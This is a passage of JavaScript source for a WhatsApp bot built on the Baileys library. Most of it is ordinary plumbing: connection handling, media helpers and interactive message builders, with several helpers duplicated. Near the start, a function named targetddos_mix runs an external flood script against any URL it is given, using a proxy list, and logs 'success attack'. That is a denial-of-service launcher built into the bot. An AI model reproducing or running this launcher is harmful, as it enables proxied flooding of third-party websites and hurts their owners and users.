if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
    
async function targetddos_mix(linkurl) {
console.log(`success attack ${linkurl}`);
exec(`node ./lib/mix.js ${linkurl} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
    
const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
store.bind(ptz.ev);

ptz.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!ptz.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(ptz, mek, store)
require("./message")(ptz, m, chatUpdate, store, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left)
 } catch (err) {
 console.log(err)
 }
});
// Setting
ptz.decodeJid = (jid) => {
if (!jid) return jid;
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {};
return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
} else return jid;
};

ptz.ev.on("contacts.update", (update) => {
for (let contact of update) {
let id = ptz.decodeJid(contact.id);
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
}
});

ptz.getName = (jid, withoutContact = false) => {
id = ptz.decodeJid(jid);
withoutContact = ptz.withoutContact || withoutContact;
let v;
if (id.endsWith("@g.us"))
return new Promise(async (resolve) => {
v = store.contacts[id] || {};
if (!(v.name || v.subject)) v = ptz.groupMetadata(id) || {};
resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
});
else
v =
id === "0@s.whatsapp.net"
? {
id,
name: "WhatsApp",
}
: id === ptz.decodeJid(ptz.user.id)
? ptz.user
: store.contacts[id] || {};
return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
};

ptz.public = global.publig; //jangan di apa apain

ptz.serializeM = (m) => smsg(ptz, m, store)

ptz.ev.on('connection.update', async (update) => {
const {
connection,
lastDisconnect
} = update
const os = require('os');
const { performance } = require("perf_hooks");
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const muptime = runtime(process.uptime()).trim()
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);
if (connection === 'close') {
let reason = new Boom(lastDisconnect?.error)?.output.statusCode
if (reason === DisconnectReason.badSession) { console.log(`Bad Session File, Please Delete Session and Verifikasi Again`); ptz.logout(); }
else if (reason === DisconnectReason.connectionClosed) { console.log("Connection closed, reconnecting...."); startBotz(); }
else if (reason === DisconnectReason.connectionLost) { console.log("Connection Lost from Server, reconnecting..."); startBotz(); }
else if (reason === DisconnectReason.connectionReplaced) { console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First"); ptz.logout(); }
else if (reason === DisconnectReason.loggedOut) { console.log(`Device Logged Out, Please Verifikasi Again And Run.`); ptz.logout(); }
else if (reason === DisconnectReason.restartRequired) { console.log("Restart Required, Restarting..."); startBotz(); }
else if (reason === DisconnectReason.timedOut) { console.log("Connection TimedOut, Reconnecting..."); startBotz(); }
else ptz.end(`Unknown DisconnectReason: ${reason}|${connection}`)
} else if (update.connection == "open" || update.receivedPendingNotifications == "true") {
lolcatjs.fromString('Connect, welcome owner!')
//lolcatjs.fromString(`${imageAscii}`)
lolcatjs.fromString(`${imageAscii}

▧  Bot Dengan User:
│ • User id: ${ptz.user.id}
│ • Name: ${ptz.user.name}
└───···

▧  Dengan Server:
│ • Platform: ${os.platform()}
│ • CPU Cores: ${cpus.length}
│ • CPU Model: ${cpus[0].model}
│ • Architecture: ${os.arch()}
│ • RAM: ${formattedUsedMem} / ${formattedTotalMem}
│ • Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
└───···

Connected !!!`)
}
})

ptz.downloadAndSaveMediaMessage = async (
      message,
      filename,
      attachExtension = true,
    ) => {
      let quoted = message.msg ? message.msg : message;
      let mime = (message.msg || message).mimetype || "";
      let messageType = message.mtype
        ? message.mtype.replace(/Message/gi, "")
        : mime.split("/")[0];
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      let type = await FileType.fromBuffer(buffer);
      trueFileName = attachExtension ? filename + "." + type.ext : filename;
      // S A V E  T O  F I L E
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    };

/*ptz.ev.on('group-participants.update', async (anu) => {
if (global.welcome){
console.log(anu)
try {
let metadata = await ptz.groupMetadata(anu.id)
let participants = anu.participants
for (let num of participants) {
try {
ppuser = await ptz.profilePictureUrl(num, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
try {
ppgroup = await ptz.profilePictureUrl(anu.id, 'image')
} catch (err) {
ppgroup = 'https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60'
}

memb = metadata.participants.length
WelcomeKu = await getBuffer(ppuser)
LeftKu = await getBuffer(ppuser)
if (anu.action == 'add') {
const buffer = await getBuffer(ppuser)
let tag = num
const time = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const members = metadata.participants.length
konteks = `Hai @${tag.split("@")[0]} 🌱, Welcome to the group ${metadata.subject}
Total Members : ${members}th
Time : ${time} ${date}`
let msgs = generateWAMessageFromContent(anu.id, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: konteks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: WelcomeKu }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Welcome 💐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [num], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: idch,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, {})
ptz.relayMessage(anu.id, msgs.message, {})
} else if (anu.action == 'remove') {
const buffer = await getBuffer(ppuser)
const time = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
let tag = num
const members = metadata.participants.length
var kontext = `@${tag.split("@")[0]} Has Left the Group ${metadata.subject}
Total Members : ${members}th
Time : ${time} ${date}`
let msgs = generateWAMessageFromContent(anu.id, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kontext
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: LeftKu }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Goodbye 👋\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [num], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: idch,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, {})
ptz.relayMessage(anu.id, msgs.message, {})
}
}
} catch (err) {
console.log(err)
}
}
})*/

    ptz.sendImage = async (jid, path, caption = "", quoted = "", options) => {
      let buffer = Buffer.isBuffer(path)
        ? path
        : /^data:.*?\/.*?;base64,/i.test(path)
          ? Buffer.from(path.split`,`[1], "base64")
          : /^https?:\/\//.test(path)
            ? await await getBuffer(path)
            : fs.existsSync(path)
              ? fs.readFileSync(path)
              : Buffer.alloc(0);
      return await ptz.sendMessage(
        jid,
        { image: buffer, caption: caption, ...options },
        { quoted },
      );
    };
ptz.ev.on("creds.update", saveCreds);
ptz.getFile = async (PATH, returnAsFilename) => {
let res, filename
const data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
const type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
if (data && returnAsFilename && !filename)(filename = path.join(__dirname, './tmp/' + new Date * 1 + '.' + type.ext), await fs.promises.writeFile(filename, data))
return {
res,
filename,
...type,
data,
deleteFile() {
return filename && fs.promises.unlink(filename)
}
}
}

ptz.sendReact = async (jid, emoticon, keys = {}) => {
let reactionMessage = {
react: {
text: emoticon,
key: keys,
},
};
return await ptz.sendMessage(jid, reactionMessage);
};

async function getMessage(key){
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg?.message
        }
        return {
            conversation: "Hi, I'm thezetsuboxygen :D"
        }
}
ptz.ev.on('messages.update', async chatUpdate => {
        for(const { key, update } of chatUpdate) {
			if(update.pollUpdates && key.fromMe) {
				const pollCreation = await getMessage(key)
				if(pollCreation) {
				    const pollUpdate = await getAggregateVotesInPollMessage({
							message: pollCreation,
							pollUpdates: update.pollUpdates,
						})
	                var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
	                if (toCmd == undefined) return
                    var prefCmd = prefix+toCmd
	                ptz.appenTextMessage(prefCmd, chatUpdate)
				}
			}
		}
    })
    
ptz.parseMention = (text = '') => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

ptz.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer} 

ptz.sendtext = async(chatId, text = '', quoted = '', opts = {}) => {
return ptz.sendMessage(chatId, { text: text, mentions: await ptz.parseMention(text), ...opts}, {quoted:quoted})
};
    
ptz.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
let type = await ptz.getFile(path, true)
let { res, data: file, filename: pathFile } = type
if (res && res.status !== 200 || file.length <= 65536) {
try { throw { json: JSON.parse(file.toString()) } }
catch (e) { if (e.json) throw e.json }
}
let opt = { filename }
if (quoted) opt.quoted = quoted
if (!type) options.asDocument = true
let mtype = '', mimetype = type.mime, convert
if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
else if (/video/.test(type.mime)) mtype = 'video'
else if (/audio/.test(type.mime)) (
convert = await (ptt ? toPTT : toAudio)(file, type.ext),
file = convert.data,
pathFile = convert.filename,
mtype = 'audio',
mimetype = 'audio/ogg; codecs=opus'
)
else mtype = 'document'
if (options.asDocument) mtype = 'document'

let message = {
...options,
caption,
ptt,
[mtype]: { url: pathFile },
mimetype
}
let m
try {
m = await ptz.sendMessage(jid, message, { ...opt, ...options })
} catch (e) {
console.error(e)
m = null
} finally {
if (!m) m = await ptz.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options })
return m
}
}
ptz.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await ptz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
ptz.cMod = (jid, copy, text = '', sender = ptz.user.id, options = {}) => {
//let copy = message.toJSON()
let mtype = Object.keys(copy.message)[0]
let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
else if (content.caption) content.caption = text || content.caption
else if (content.text) content.text = text || content.text
if (typeof content !== 'string') msg[mtype] = {
...content,
...options
}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
copy.key.remoteJid = jid
copy.key.fromMe = sender === ptz.user.id

return proto.WebMessageInfo.fromObject(copy)
}
ptz.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
let type = await ptz.getFile(path, true)
let { res, data: file, filename: pathFile } = type
if (res && res.status !== 200 || file.length <= 65536) {
try { throw { json: JSON.parse(file.toString()) } }
catch (e) { if (e.json) throw e.json }
}
let opt = { filename }
if (quoted) opt.quoted = quoted
if (!type) options.asDocument = true
let mtype = '', mimetype = type.mime, convert
if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
else if (/video/.test(type.mime)) mtype = 'video'
else if (/audio/.test(type.mime)) (
convert = await (ptt ? toPTT : toAudio)(file, type.ext),
file = convert.data,
pathFile = convert.filename,
mtype = 'audio',
mimetype = 'audio/ogg; codecs=opus'
)
else mtype = 'document'
if (options.asDocument) mtype = 'document'

let message = {
...options,
caption,
ptt,
[mtype]: { url: pathFile },
mimetype
}
let m
try {
m = await ptz.sendMessage(jid, message, { ...opt, ...options })
} catch (e) {
console.error(e)
m = null
} finally {
if (!m) m = await ptz.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options })
return m
}
}
ptz.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}
//const path = require('path');

ptz.sendTextWithMentions = async (jid, text, quoted, options = {}) => ptz.sendMessage(jid, {
        text: text,
        mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'),
        ...options
    }, {
        quoted
    })
    
ptz.reply = (jid, text = '', quoted, options) => {
        return Buffer.isBuffer(text) ? ptz.sendFile(jid, text, 'file', '', quoted, false, options) : ptz.sendMessage(jid, { ...options, text, mentions: ptz.parseMention(text) }, { quoted, ...options, mentions: ptz.parseMention(text) })
}

ptz.sendList = async (jid, title, footer, btn, options = {}) => {
                let msg = generateWAMessageFromContent(jid, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                ...options,
                                body: proto.Message.InteractiveMessage.Body.create({ text: title }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: footer || "Powered By Hyuu" }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [
                                        {
                                            "name": "single_select",
                                            "buttonParamsJson": JSON.stringify(btn)
                                        },
                                    ]
                                })
                            })
                        }
                    }
                }, {})
                return await ptz.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                })
            }
 
ptz.sendCata = async (jid, title, footer, m, options = {}) => {
let etc = generateWAMessageFromContent(jid, { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": footer,
      ...(await prepareWAMessageMedia({ image: `${thumbnail}` }, { upload: ptz.waUploadToServer })),
      "hasMediaAttachment": true
    },
    "body": {
      "text": title
    },
    "shopStorefrontMessage": {
      "id": "1",
      "surface": "UNKNOWN_SURFACE",
      "messageVersion": 0
    }
  }
}
}
})

ptz.relayMessage(m.chat, etc, {})}

ptz.sendUrlPanel = async (jid, title, footer , title1, btn, m, options = {}) => {
let msg = generateWAMessageFromContent(jid, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363297579688682@newsletter',
			newsletterName: 'Powered By KyuuRzy-Ai 🧢', 
			serverMessageId: -1
		},
 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'KyuuRzy', 
 thumbnailUrl: `${global.thumbnailpanel}`, 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: title
 }),
  body: proto.Message.InteractiveMessage.Body.create({
 text: title1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: footer
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: title,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: `${global.thumbnailpanel}` }}, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${domain}\",\"merchant_url\":\"${domain}\"}`
},
]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}

ptz.sendUrl = async (jid, title, footer , title1, btn, m, options = {}) => {
let msg = generateWAMessageFromContent(jid, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363267533195844@newsletter',
			newsletterName: 'Powered By KyuuRzy', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'KyuuRzy', 
 thumbnailUrl: `${global.thumbnail}`, 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: title
 }),
  body: proto.Message.InteractiveMessage.Body.create({
 text: title1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: footer
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: title,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` }}, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Url Instagram\",\"url\":\"${url}\",\"merchant_url\":\"${url}\"}`
},
]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}

ptz.sendView = async (jid, headerTitle, bodyMessage, footer, urlView, quoted, options = {}) => {
            await ptz.relayMessage(jid, {
                    viewOnceMessage: {
                      message: {
                        interactiveMessage: {
                          header: {
                            title: headerTitle,
                            subtitle: "Subtitle message",
                            hasMediaAttachment: false
                          },
                          body: {
                            text: bodyMessage
                          },
                          footer: {
                            text: footer
                          },
                          nativeFlowMessage: {
                            buttons: [{
                              name: "open_webview",
                              buttonParamsJson: `{\"link\":{\"in_app_webview\":true,\"url\":\"${urlView}\",\"success_url\":\"https://dinorunner.com/success\",\"cancel_url\":\"${urlView}\"}}`
                            }],
                           messageParamsJson: ""
                          }
                        }
                      }
                    }
               }, { quoted, ephemeralExpiration: 86400 })}

ptz.sendUrl = async (jid, title, footer , title1, btn, m, options = {}) => {
let msg = generateWAMessageFromContent(jid, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363267533195844@newsletter',
			newsletterName: 'Powered By KyuuRzy', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'KyuuRzy', 
 thumbnailUrl: `${global.thumbnail}`, 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: title
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: footer
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: title1,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` }}, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Url Instagram\",\"url\":\"${url}\",\"merchant_url\":\"${url}\"}`
},
]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}

ptz.sendListImg = async (jid, title, footer, title1, btn, m, options = {}) => {
let msg = generateWAMessageFromContent(jid, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363297579688682@newsletter',
			newsletterName: 'Powered By 𝐕𝐞𝐬𝐭𝐢𝐚-𝟕', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: '𝐕𝐞𝐬𝐭𝐢𝐚-𝟕', 
 thumbnailUrl: `${global.thumbnail}`, 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: title
 }),
  body: proto.Message.InteractiveMessage.Body.create({
 text: title1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: footer
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: title,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` }}, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(btn)
              },

 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
    
ptz.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await(const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
    let savePath = path.join(__dirname, 'tmp', trueFileName); // Save to 'tmp' folder
    await fs.writeFileSync(savePath, buffer);
    return savePath;
};
ptz.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await ptz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
ptz.sendText = (jid, text, quoted = '', options) => ptz.sendMessage(jid, { text: text, ...options }, { quoted })
return ptz;
}
/*
async function startBotzz() {
    const valid = await validIp();
    if (valid) {
        await startBotz();
    }
}*/
startBotz();

//batas
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
